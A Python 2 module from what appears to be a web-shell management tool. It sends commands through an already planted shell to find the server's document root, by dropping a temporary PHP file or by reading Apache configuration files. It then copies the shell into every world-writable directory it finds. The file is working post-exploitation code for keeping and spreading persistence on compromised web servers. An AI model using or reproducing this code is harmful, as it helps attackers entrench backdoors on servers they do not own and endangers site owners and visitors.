from core.libs.menu import Colors, getargs
from core.libs.request_handler import make_request
from urllib2 import urlopen


class LinuxVersion(object):
    def __init__(self):
        self.url = make_request.url

    def get_doc_root(self):
        cmd = "echo \"<?php echo \$_SERVER['DOCUMENT_ROOT']; ?>\" > ~doc_root.php; [ -r ~doc_root.php ] && echo exists || echo not_exist"
        # Make a request to create a php file (thanks @0xAli)
        if make_request.get_page_source(cmd)[0] == 'exists':
            make_request.url = make_request.url.replace(make_request.url.split('/')[-1], '~doc_root.php')
            doc_root = urlopen(make_request.url).read().strip()
            make_request.url = self.url
            cmd = "rm ~doc_root.php"
            make_request.get_page_source(cmd)
        else:
            correct_command = ['lsb_release -d', 'cat /etc/*-release']
            for command in correct_command:
                distrib_description = make_request.get_page_source(command)[0].lower()
                if distrib_description:
                    if 'ubuntu' in distrib_description:
                        cmd = "grep -i \"DocumentRoot\" /etc/apache2/sites-available/default| awk '{print $2}'"
                        doc_root = make_request.get_page_source(cmd)[0]
                    elif 'centos' in distrib_description or 'fedora' in distrib_description or 'red hat' in distrib_description:
                        cmd = "grep -i 'DocumentRoot' /etc/httpd/conf/httpd.conf"
                        doc_root = make_request.get_page_source(cmd)[0]
                    else:
                        doc_root = None
                    break
                else:
                    pass

        return doc_root


class ShellHandler(object):
    # A method to spread the shell in all writable directories
    def spread_shell(self):
        provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
        done = make_request.get_page_source(cmd)
        if done:
            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
                    shell_name=shell_name,
                    writable_length=len(done),
                    hot=Colors.HOT,
                    end=Colors.END,)
            success += '\n[+] To check these paths type {0}writable{1}'.format(Colors.HOT, Colors.END)
            print success
        else:
            print '[!] Something went wrong while spreading shell.'

linux = LinuxVersion()
shell_handler = ShellHandler()
